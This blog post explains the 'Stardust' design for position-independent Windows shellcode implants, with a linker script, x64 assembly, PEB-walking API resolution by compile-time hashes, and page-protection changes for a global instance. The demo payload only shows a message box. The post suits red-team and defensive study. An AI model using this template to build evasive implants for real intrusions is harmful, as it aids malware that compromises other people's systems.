# https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/

[Skip to main content](https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/#__docusaurus_skipToContent_fallback)

Hello friend, friendly neighborhood 5pider here.

This is a small blog about writing what I call " **modern**" position independent implants. Modern in the sense of being easy to write, easy to maintain, flexible and modular.
These modern implants add support for global variables, raw strings and compile time hashing to position independent code which is known to have
such limitations as not being able to use global variables and literal strings (besides crafting stack strings).

## Reflective Loader: A decade old design

First, let's talk about reflective dll injection or loading. This technique has been around for more than a decade ( [ReflectiveDLLInjection](https://github.com/stephenfewer/ReflectiveDLLInjection/)) and it requires a dll to export a position independent function which is normally called the reflective loader.
This loader function can be invoked by injecting the dll into the memory and calling the function so the dll can load itself. Another way would be prepending the reflective loader to the target
dll we wanna inject. Either way, both techniques achieve the same goal which is to manually map the dll into the current process memory.
I am not going into details on how reflective loaders work in this blog post besides this surface-level pattern.

A lot of new and old commercial Command and Control products have their core implant designed as a reflective dll. As it is easy to develop, stable and easy to maintain since it's just a simple PE with an exported function. Though, it means that it follows a very specific and common pattern which is: to find the offset of the exported reflective loader function and call it, the dll is then going to allocate a new memory region (be it using virtual memory allocation like `VirtualAlloc`/`NtAllocateVirtualMemory` or module stomping), parse the pe format of itself and then manually map itself into the newly available memory.

Here is where I have a problem with the reflective loader design. While it was extremely fun for me to learn about them years ago and enjoyed working on weird ways of loading dll into memory and executing them,
I always noticed how noisy it was to manually map a dll into memory. The whole "allocates a new memory region", parse pe header, copy sections, apply section protections, relocation and table resolving import
address was a lot just to get a payload running in memory. I began my research into a new method by writing a reflective loader that already has its sections aligned. This way I don't need to allocate a new memory region, and I can just apply relocation (write access needed), resolve the import address table and then apply the correct section protection. This eliminated the need to allocate a new memory region but still I was not satisfied. I started to think of a way to completely write implants in such a way that I wouldn't need to rely on a loader stub, a specific metadata header (for example the `IMAGE_NT_HEADER` or a custom one that keeps needed info about the Pe like relocation) and fully just to execute it as is without doing a lot of memory patching.

Another reason why I am not a fan of reflective loaders is that they leave a lot of data that can be signatures in memory if no proper cleanup is being applied or done (like NtHeaders, the reflective loader itself, etc.). Damn em signatures rrrrr.

Either way enough talking about reflective loaders, I switched from using reflective loaders a year ago and started to fully write my implants to be position independent, but there were a few things that bothered me or gave me issues. One of them would be having a global variable instance (keeps track of configuration, resolved win32 apis, loaded modules, etc.) and there were edge cases where passing a context struct wasn't possible. Like for example for COFF loading (more specifically loading beacon object files) I needed to find a way to pass the implant instance to the called Beacon apis (like `BeaconPrintf`, `BeaconOutput`, or any other beacon api that requires sending back data from the object file back to the server). There I came up with this solution which allowed me to access my global variable from any location in my implant.

Let's get straight into what I call the `Stardust` design.

## Stardust design

The `Stardust` design is fairly simple, as all it does is separate certain parts of the code and data into its own sections & pages.

The implant overview of how it is designed:

```
[   .text$A    ] aligns the stack, executes entrypoint, util function to get the base address, etc.
[   .text$B    ] C entrypoint, implant prepation, communication, commands, evasion techniques, etc.
[   .rdata*    ] literal strings and data (maybe even configuration)
[  page align  ] alignt page by 0x1000 so ".global" section is in its own page
[   .global    ] global variables
[   .text$E    ] code to get the rip of the end of implant
```

this is basically how the implant is built and I am going through every single section and explaining what it contains and what purpose it serves.
We can take a look at the linker script used to separate the sections and align the code correctly:

```ld
LINK_BASE = 0x0000;

ENTRY( Start )

SECTIONS
{
    . = LINK_BASE;
    .text : {
        . = LINK_BASE;
        *( .text$A );
        *( .text$B );
        *( .rdata* );
        FILL( 0x00 )
        . = ALIGN( 0x1000 );
        __Instance_offset = .;
        *( .global );
        *( .text$E );
        *( .text$P );
    }

    .eh_frame : {
        *( .eh_frame )
    }
}
```

Ignore my poorly written linker script as it was my first time writing a linker script. I am aware there are surely better ways to write this one.
It was enough for me to get this design working but I'm open to any feedback and criticism. Either way, this linker script tells the linker to do the
following things at linking time: the section should be in the specified order, include the `.rdata` section that contains strings and other read-only data,
tell the linker to align the next section to its own page so we can change the protection of the page which is required to for later to have global variables
and save the offset to the `.global` section into `__Instance_offset`.

Let's start with the first section which is called `.text$A` and is the entrypoint of our pic implant.

```nasm
;;
;; Main shellcode entrypoint.
;;
[SECTION .text$A]
    ;;
    ;; shellcode entrypoint
    ;; aligns the stack by 16-bytes to avoid any unwanted
    ;; crashes while calling win32 functions and execute
    ;; the true C code entrypoint
    ;;
    Start:
        push  rsi
        mov   rsi, rsp
        and   rsp, 0FFFFFFFFFFFFFFF0h
        sub   rsp, 020h
        call  PreMain
        mov   rsp, rsi
        pop   rsi
        ret

    ;;
    ;; get rip to the start of the agent
    ;;
    StRipStart:
        call StRipPtrStart
        ret

    ;;
    ;; get the return address of StRipStart and put it into the rax register
    ;;
    StRipPtrStart:
        mov	rax, [rsp] ;; get the return address
        sub rax, 0x1b  ;; subtract the instructions size to get the base address
        ret            ;; return to StRipStart
```

This section contains the code for aligning the stack by 16 bytes (as stated by the [Windows x64 calling convention](https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170#alignment), if not handled any call to win32 might fail/crash due to the stack not being aligned properly),
retrieving the base address from the implant itself and calling the Stardust `PreMain` entry point (which is located in the `.text$B` section) which is going to set up the implant for further execution.

As previously stated `PreMain` is located in `.text$B` as this section contains the core implant code which is written in C/C++.

```c
EXTERN_C FUNC VOID PreMain(
    PVOID Param
) {
    INSTANCE Stardust = { 0 };
    PVOID    Heap     = { 0 };
    PVOID    MmAddr   = { 0 };
    SIZE_T   MmSize   = { 0 };
    ULONG    Protect  = { 0 };

    MmZero( & Stardust, sizeof( Stardust ) );

    //
    // get the process heap handle from Peb
    //
    Heap = NtCurrentPeb()->ProcessHeap;

    //
    // get the base address of the current implant in memory and the end.
    // subtract the implant end address with the start address you will
    // get the size of the implant in memory
    //
    Stardust.Base.Buffer = StRipStart();
    Stardust.Base.Length = U_PTR( StRipEnd() ) - U_PTR( Stardust.Base.Buffer );

    //
    // setting up global instance
    //
    ...

    //
    // cleanup
    //
    ...

    //
    // now execute the implant entrypoint
    //
    Main( Param );
}
```

The `PreMain` function takes care of finding the right base address and size of the implant in memory and finding the global `Instance` variable which holds a pointer to our `INSTANCE` struct (that can contain any variable, configuration, pointers, and any other type of data we would wanna access during runtime from anywhere in the implant code). Now let's take a look into the `PreMain` function code line by line.

The first few lines are there to just prepare some variables like clearing out the `Stardust` structure retrieving the `ProcessHeap` handle from PEB and saving it into a variable called `Heap` since we later are going to try to allocate space on the heap which should hold our `Instance` struct data.

With this out of the way, we can start right with something important which is retrieving the base address of the implant in memory as this is required for accessing our global variable later. Getting the base address of the implant is possible via the `StRipStart` function which is as previously shown implemented inside of the `.text$A` section and is implemented like this:

```nasm
    ;;
    ;; get rip to the start of the agent
    ;;
    StRipStart:
        call StRipPtrStart
        ret

    ;;
    ;; get the return address of StRipStart and put it into the rax register
    ;;
    StRipPtrStart:
        mov rax, [rsp] ;; get the return address
        sub rax, 0x1b  ;; subtract the instructions size to get the base address
        ret            ;; return to StRipStart
```

> You may ask why `mov rax [rsp]` is used to read the return address while there are smaller/faster alterantives like i used to have it in the older repo called `ShellcodeTemplate` like this:
>
> ```nasm
> GetRIP:
>   call retptr
>
> retptr:
>   pop rax
>   sub rax, 5
>   ret
> ```
>
> The reason is because [x86matthew](https://twitter.com/x86matthew) pointed out that i should make it CET-compatible by matching each `ret` with the correct call.

I am going to describe and explain the reason behind each single line. After calling `StRipStart`, the function is going to call another sub-function to push the return address of itself to the stack, `StRipPtrStart` is then going to read the return address from the stack and store it inside of `rax` to later subtract the instruction size of itself, of `StRipStart` and the instruction size of `Start` to finally get the base address. We can simply count the instruction size in memory but I love using radare2 so I used it to get the size of the `Start` function like this:

```
$ r2 -A bin/stardust.x64.bin
[0x00000000]> pdf
┌ 22: fcn.00000000 (int64_t arg1, int64_t arg2, int64_t arg3);
│           0x00000000      56             push rsi                    ; arg2
│           0x00000001      4889e6         mov rsi, rsp                ; int64_t arg2
│           0x00000004      4883e4f0       and rsp, 0xfffffffffffffff0
│           0x00000008      4883ec20       sub rsp, 0x20
│           0x0000000c      e8df010000     call fcn.000001f0
│           0x00000011      4889f4         mov rsp, rsi
│           0x00000014      5e             pop rsi
└           0x00000015      c3             ret
[0x00000000]> afi ~.size
size: 22
```

Either way, now we can get the base address of the implant in memory by simply subtracting the instruction sizes from both `Start` (`0x16`) and `StRipStart` (only the call size which is `0x5`) from the return address which is located inside of `rax` which gets end up getting you the base address of the implant. After retrieving the address of the base address we now need the address of the end of the implant so we can calculate the exact size of the implant in memory.

Getting the end address of the implant in memory works the same as previously shown with `StRipStart` which is located in `.text$A`, besides this time it is located in `.text$E`, which is the last code section of the implant that contains the following code:

```nasm
;;
;; end of the implant code
;;
[SECTION .text$E]

    ;;
    ;; get end of the implant
    ;;
    StRipEnd:
        call StRetPtrEnd
        ret

    ;;
    ;; get the return address of StRipEnd and put it into the rax register
    ;;
    StRetPtrEnd:
        mov rax, [rsp] ;; get the return address
        add rax, 0xa   ;; get implant end address
        ret            ;; return to StRipEnd
```

This way of retrieving the end address of the implant in memory is very similar to the one that gets the base address with one key difference being that it is going to add the instructions size of the `StRipEnd` function (only a single byte because of `ret`) and `StRetPtrEnd` which is the size of `0x9` bytes, now we got a total number of instructions (which is 10 bytes) to add to the return address to get to our implant end address.

After executing both functions `StRipStart` and `StRipEnd` you should have the entire memory range of where the implant lives:

```c
//
// get the base address of the current implant in memory and the end.
// subtract the implant end address with the start address you will
// get the size of the implant in memory
//
Stardust.Base.Buffer = StRipStart();
Stardust.Base.Length = U_PTR( StRipEnd() ) - U_PTR( Stardust.Base.Buffer );
```

## Global Instance

The next few lines are to prepare the global instance by getting the offset to our `.global` section where our Instance pointer is going to be located in.

```c
//
// get the offset and address of our global instance structure
//
MmAddr = Stardust.Base.Buffer + InstanceOffset();
MmSize = sizeof( PVOID );
```

This works by getting the offset to the instance via `InstanceOffset()` is a macro that contains the offset to the instance location, which has been inserted into during linking time as we specified in the linker script above to save the location offset to `__Instance_offset` so we can use it directly in our C code as it is defined like this:

```c
#define InstanceOffset() ( U_PTR( & __Instance_offset ) )
```

We defined `__Instance_offset` as an external variable along with `__Instance` as they are going to contain our instance offset & pointer.

```c
//
// stardust instances
//
EXTERN_C ULONG __Instance_offset;
EXTERN_C PVOID __Instance;
```

After getting the offset to our global instance, we can add the offset to the base address and we should get the pointer to the instance in the implant. After getting the pointer to the global instance in memory we can save it into `MmAddr` which we later going to use to change the protection of the page so we can write our Heap pointer into this global space where we'll store all of our instance data.

The next few lines resolve the functions we need so we can change the protection of our `.global` section page and allocating memory on the heap, which in this case we are going to resolve `ntdll!NtProtectVirtualMemory` and `ntdll!RtlAllocateHeap` using `LdrModulePeb` (retrieve the module by iterating over the PEB `InLoadOrderModuleList` list) and `LdrFunction` (retrieve the exported function pointer from the specified module).

```c
//
// resolve ntdll!RtlAllocateHeap and ntdll!NtProtectVirtualMemory for
// updating/patching the Instance in the current memory
//
if ( ( Stardust.Modules.Ntdll = LdrModulePeb( H_MODULE_NTDLL ) ) ) {
    if ( ! ( Stardust.Win32.RtlAllocateHeap        = LdrFunction( Stardust.Modules.Ntdll, HASH_STR( "RtlAllocateHeap"        ) ) ) ||
         ! ( Stardust.Win32.NtProtectVirtualMemory = LdrFunction( Stardust.Modules.Ntdll, HASH_STR( "NtProtectVirtualMemory" ) ) )
    ) {
        return;
    }
}
```

We have an easy-to-use macro called `HASH_STR` which is going to hash the specified string for `LdrFunction` to use since I couldn't be bothered anymore wasting my seconds using python scripts to hash my function strings and insert them manually either into the function or as a compiler definition. We are going to cover the implementation of this macro later in this blog post (under [Compile time hashing](https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/#compile-time-hashing)).

After resolving the functions we need we can go straight into applying `PAGE_READWRITE` protection to our `.global` section to be able to write our allocated heap pointer into it.

```c
//
// change the protection of the .global section page to RW
// to be able to write the allocated instance heap address
//
if ( ! NT_SUCCESS( Stardust.Win32.NtProtectVirtualMemory(
    NtCurrentProcess(),
    & MmAddr,
    & MmSize,
    PAGE_READWRITE,
    & Protect
) ) ) {
    return;
}

//
// assign heap address into the RW memory page
//
if ( ! ( C_DEF( MmAddr ) = Stardust.Win32.RtlAllocateHeap( Heap, HEAP_ZERO_MEMORY, sizeof( INSTANCE ) ) ) ) {
    return;
}
```

After cleaning up some data from the stack and other parts of the code we can now execute the main entry point of our implant which is going to be our main payload. This payload will handle resolving other win32 functions and modules, communication, tasking and executing commands, and more.

```c
//
// copy the local instance into the heap,
// zero out the instance from stack and
// remove RtRipEnd code/instructions as
// they are not needed anymore
//
MmCopy( C_DEF( MmAddr ), &Stardust, sizeof( INSTANCE ) );
MmZero( & Stardust, sizeof( INSTANCE ) );
MmZero( C_PTR( U_PTR( MmAddr ) + sizeof( PVOID ) ), 0x18 );

//
// now execute the implant entrypoint
//
Main( Param );
```

Before going any further and covering how the main function is implemented let's talk about compile-time hashing and how it is implemented.

## Compile time hashing

There isn't much to talk or say about besides that we are using the C++ `constexpr` feature to execute a function at compile-time to turn a string into a djb2 hash.

```cpp
#define HASH_STR( x ) ExprHashStringA( ( x ) )

constexpr ULONG ExprHashStringA(
    _In_ PCHAR String
) {
    ULONG Hash = { 0 };
    CHAR  Char = { 0 };

    Hash = H_MAGIC_KEY;

    if ( ! String ) {
        return 0;
    }

    while ( ( Char = *String++ ) ) {
        /* turn current character to uppercase */
        if ( Char >= 'a' ) {
            Char -= 0x20;
        }

        Hash = ( ( Hash << H_MAGIC_SEED ) + Hash ) + Char;
    }

    return Hash;
}
```

## Main Payload

Alright, I think everything is now clear so let's start writing our main payload now, let's keep it simple and try to spawn a message box
that displays the current working process file path with the title being `Stardust Message`. This should show enough of what it is capable of
and how it can be used to further develop a working implant.

```c
FUNC VOID Main(
    _In_ PVOID Param
) {
    STARDUST_INSTANCE

    PVOID Message = { 0 };

    //
    // resolve kernel32.dll related functions
    //
    if ( ( Instance()->Modules.Kernel32 = LdrModulePeb( H_MODULE_KERNEL32 ) ) ) {
        if ( ! ( Instance()->Win32.LoadLibraryW = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "LoadLibraryW" ) ) ) ) {
            return;
        }
    }

    //
    // resolve user32.dll related functions
    //
    if ( ( Instance()->Modules.User32 = Instance()->Win32.LoadLibraryW( L"User32" ) ) ) {
        if ( ! ( Instance()->Win32.MessageBoxW = LdrFunction( Instance()->Modules.User32, HASH_STR( "MessageBoxW" ) ) ) ) {
            return;
        }
    }

    Message = NtCurrentPeb()->ProcessParameters->ImagePathName.Buffer;

    //
    // pop da message
    //
    Instance()->Win32.MessageBoxW( NULL, Message, L"Stardust MessageBox", MB_OK );
}
```

Let's go over what to consider and how to use the stardust design while developing and designing a position-independent implant.
Every function should start with the FUNC macro as it tells the linker script where to store the function, which in this case is telling to store it inside of `.text$B` as this section is going to be the core section that contains all of implant C functions.

```c
#define D_SEC( x )  __attribute__( ( section( ".text$" #x "" ) ) )
#define FUNC        D_SEC( B )
```

The head of the function should start with `STARDUST_INSTANCE` if the function requires access to the global instance.

```c
//
// instance related macros
//
#define InstanceOffset()   ( U_PTR( & __Instance_offset ) )
#define InstancePtr()      ( ( PINSTANCE ) C_DEF( C_PTR( U_PTR( StRipStart() ) + InstanceOffset() ) ) )
#define Instance()         ( ( PINSTANCE ) __LocalInstance )
#define STARDUST_INSTANCE  PINSTANCE __LocalInstance = InstancePtr();
```

This macro declares a variable that points to the implant global instance. After specifying the macro the global instance can be easily accessed by using the `Instance()` macro.

After writing our main implant payload we need to compile it. The project contains a default makefile which for now only compiles the `Stardust` project into a 64-bit binary as
I couldn't be bothered supporting x86. However, it should be fairly easy to add x86 support as it just requires the assembly part to be re-written to x86.

```
$ make
[*] compile assembly files
[+] compile x64 executable
/usr/lib/gcc/x86_64-w64-mingw32/13.1.0/../../../../x86_64-w64-mingw32/bin/ld: bin/stardust.x64.exe:.text: section below image base
/usr/lib/gcc/x86_64-w64-mingw32/13.1.0/../../../../x86_64-w64-mingw32/bin/ld: bin/stardust.x64.exe:.eh_fram: section below image base
[*] payload len : 4128 bytes
[*] size        : 8192 bytes
[*] padding     : 4064 bytes
[*] page count  : 2.0 pages

$ ls -l bin
total 12
drwxr-xr-x 2 spider spider 4096 Jan 27 17:53 obj
-rw-r--r-- 1 spider spider 8192 Jan 27 17:53 stardust.x64.bin
```

Now that we successfully built the implant binary it can be included in any type of loader or the test loader that comes with the project can be used under `scripts/loader.x64.exe` (a simple `VirtualAlloc` and execute loader).

![Payload executed](https://5pider.net/assets/images/MessagePop-4e72bc8a03044463b6afa71d8881646a.png)

Last but not least the entire project is available on my Github under [Stardust](https://github.com/Cracked5pider/Stardust).

## Reasons

One reason why I wrote this blog post was mainly that at the time of writing this blog post, Havoc is getting rewritten from scratch.
So I am using this template to develop a fully PIC implant without using any reflective loaders anymore.

Another reason is I wanted to show a different way of designing malware and especially writing fully position independent malware as they aren't that common so far as I have seen. Especially position independent malware that offers features like global instance access, raw strings and compile time obfuscation (but well this part is not particularly interesting or new, tho a nice thing to have).

TLDR: Fck em reflective loaders

## Last words, credit, reference and shoutouts

I hope this blog was understandable and easy to follow. I am aware it is nothing big but is a neat way of designing malware which I wanted to share (and I couldn't fit it into a single tweet). Any kind of criticism and feedback is very welcomed and appreciated as this was my first time writing and explaining something in that level of detail. (My [Twitter](https://twitter.com/C5pider/) DMs is open for criticism & feedback). I can't take credit for any of this works as most of it is based on other peoples work, projects and especially help. So credit, reference and shoutouts are listed below.

- [Modexp](https://twitter.com/modexpblog) for his amazing blog posts ( [link](https://modexp.wordpress.com/2016/12/26/windows-pic)).
- [Austin Hudson](https://twitter.com/ilove2pwn_) for his [titanldr-ng](https://github.com/realoriginal/titanldr-ng).
- [Kyle Avery](https://twitter.com/kyleavery_) for his [AceLdr](https://github.com/kyleavery/AceLdr).
- [x86matthew](https://twitter.com/x86matthew) for helping me with some of the assembly parts.
- [mrexodia](https://twitter.com/mrexodia) and his blog ( [RISC-Y Business: Raging against the reduced machine](https://secret.club/2023/12/24/riscy-business.html)) helped me better understand linker scripts.
- [Steve S.](https://twitter.com/0xtriboulet) for proofreading this blog.

- [Reflective Loader: A decade old design](https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/#reflective-loader-a-decade-old-design)
- [Stardust design](https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/#stardust-design)
- [Global Instance](https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/#global-instance)
- [Compile time hashing](https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/#compile-time-hashing)
- [Main Payload](https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/#main-payload)
- [Reasons](https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/#reasons)
- [Last words, credit, reference and shoutouts](https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/#last-words-credit-reference-and-shoutouts)